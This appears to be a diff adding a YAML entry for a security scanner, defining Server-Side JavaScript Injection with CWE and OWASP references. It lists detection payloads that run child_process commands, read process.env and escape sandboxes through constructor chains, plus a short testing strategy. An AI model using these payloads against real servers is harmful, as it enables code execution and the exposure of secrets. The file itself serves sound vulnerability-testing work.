@@ -1,0 +1,20 @@
+id: SSJI
+name: Server-Side JavaScript Injection
+cwe:
+- CWE-94
+owasp: A03:2021 Injection
+severity_range: Critical
+description: Node.js vm module, eval() in server context, or template engines executing JS server-side.
+detection:
+  payloads:
+  - process.env
+  - require('child_process').execSync('id').toString()
+  - global.process.mainModule.require('child_process').execSync('id')
+  - this.constructor.constructor('return process')()
+  strategy:
+  - 'Identify Node.js server (X-Powered-By: Express, etc.)'
+  - Find parameters that may be evaluated server-side
+  - Test sandbox escape via constructor chains
+  - Use OOB callback to confirm execution
+references:
+- https://www.acunetix.com/blog/web-security-zone/exploiting-ssji/
